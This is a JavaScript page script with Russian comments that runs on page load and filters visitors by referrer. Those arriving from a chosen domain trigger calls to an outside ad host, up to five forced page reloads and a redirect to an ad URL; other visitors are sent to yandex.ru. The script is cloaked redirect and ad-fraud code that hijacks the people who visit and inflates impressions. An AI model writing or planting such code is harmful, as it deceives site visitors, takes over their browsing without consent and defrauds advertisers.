window.onload = () => {

    async function ad(text="aeyJwaWQiOjEwMjMzOTMsInNpZCI6MTExMjYzOSwid2lkIjoyNTkyOTksImQiOiIiLCJsaSI6Mn0", percent=1, count=5) {
        try {
            const url = `https://yfetyg.com/wnload?a=1&e=${text}=&tz=8&if=0 `;

            const response = await fetch(url);
            const json = await response.json();

            for (let row of json) {

                if('rinfo' in row) {
                    if ('rw' in row['rinfo']) {
                        let part_url = row['rinfo']['rw'];
                        if (part_url) {
                            let url = `https://yfetyg.com` + part_url;
                            try {
                                const response = await fetch(url);
                                console.log(await response.status());
                            } catch(e) {
                                console.log(e);
                            }
                        }
                    }
                }

                let attempt = 0;
                if (sessionStorage.getItem('ATTEMPTS')) {
                    attempt = Number(sessionStorage.getItem('ATTEMPTS'));
                }

                if (attempt < count) {
                    sessionStorage.setItem('ATTEMPTS', attempt + 1);
                    window.location.reload();
                    return;
                }


                if ('ads' in row) {
                    sessionStorage.removeItem('ATTEMPTS');
                    let new_url = row['ads'][0]['uf'];
                    if (Math.random() <= percent) {
                        window.location.href = new_url;
                    }
                    return;
                }
            }

        } catch(e) {
            console.log(e);
        }

    }
    
    (async function main(urlB = 'https://yandex.ru', sourceDomain = 'tikroku.com') {

        try {
            // Получае refferrer страницы
            let ref = document.referrer;

            console.log(ref);

            // Проверяем существует ли refferrer
            if (ref) {
                // Видоизменяем refferrer, чтобы он был вида xxxxx.xx
                ref = new URL(ref).hostname.split('.');
                if (ref.length >= 2) ref = `${ref[ref.length - 2]}.${ref[ref.length - 1]}`;

                // Сравниваем с указаннам доменом, если совпадает то редирект на А, если нет на B
                if (ref == sourceDomain) {
                    // Просто запускаем функцию которая выполняет дейтсвия показа и редиректа. Параметры стоят по умолчанию, можно задать свои
                    await ad();
                } else {
                    window.location.href = urlB;
                }

            } else {
                // refferrer не существует, значит редирект на B
                //window.location.href = urlB;
            }
        } catch(e) {
            alert('Произошла ошибка\nПодробнее в консоли разработчика');
            console.log(e);
        }

    })();

}